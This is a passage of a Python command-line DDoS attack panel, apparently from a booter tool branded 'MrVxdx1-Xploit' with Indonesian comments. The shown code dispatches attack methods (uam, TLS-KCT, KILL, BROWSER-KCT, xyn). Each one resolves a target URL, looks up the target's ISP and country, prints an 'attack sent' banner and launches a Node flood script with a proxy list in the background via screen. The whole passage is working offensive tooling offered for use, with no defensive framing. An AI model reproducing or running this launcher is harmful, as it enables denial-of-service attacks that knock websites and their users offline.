                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'uam',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • MrVxdx1-Xploit • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/charostis\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @charostis\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node uam.js {url} {duration} 10 10 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "TLS-KCT" or sinput == "tls-kct":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'TLS-KCT',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • MrVxdx1-Xploit • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/charostis\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @charostis\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node TLS-KCT.js {url} {duration} 10 proxy.txt 10 captha')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "KILL" or sinput == "kill":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'KILL',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • MrVxdx1-Xploit • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/charostis\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @charostis\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node KILL.js {url} {duration} 10 10 proxt.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "BROWSER-KCT" or sinput == "browser-kct":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'BROWSER-KCT',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • MrVxdx1-Xploit • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/charostis\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @charostis\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node BROWSER-KCT.js GET {url} {duration} 10 10 proxy.txt --query 1 --delay 80 --randrate 90 --full')
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "xyn" or sinput == "XYN":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'xyn',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • MrVxdx1-Xploit • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/charostis\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @charostis\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node xyn.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

login_filename = "login_data.txt"
login_data = read_login_data(login_filename)

if login_data is not None:
    login(login_data)